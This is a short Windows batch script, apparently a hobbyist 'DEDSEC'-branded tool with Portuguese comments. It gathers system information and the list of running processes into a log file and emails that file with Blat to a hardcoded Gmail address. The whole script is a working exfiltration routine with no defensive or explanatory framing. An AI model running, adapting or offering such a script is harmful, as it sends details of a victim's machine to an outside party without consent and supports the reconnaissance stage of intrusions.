@echo off
title [DEDSEC] Coletando Informações e Enviando por Email
color 0a
echo [DEDSEC] Coletando informações...

REM Definir o caminho da pasta atual (onde o arquivo .bat está)
set local_folder=%~dp0

REM Criar o arquivo de log
set logFile=%local_folder%systemlog.txt

REM Coletar informações do sistema
echo Informacoes do sistema: > %logFile%
systeminfo >> %logFile%
echo. >> %logFile%
echo Processos em execucao: >> %logFile%
tasklist >> %logFile%

REM Usar Blat para enviar o arquivo de log por email (você precisará do Blat instalado)
blat %logFile% -to cleuzadasilvadossantos@gmail.com -subject "Log do sistema" -body "Veja em anexo o log do sistema."

REM Exibir mensagem de sucesso
echo [DEDSEC] Informacoes coletadas e enviadas por email.
pause

REM Fechar a janela do CMD atual
exit
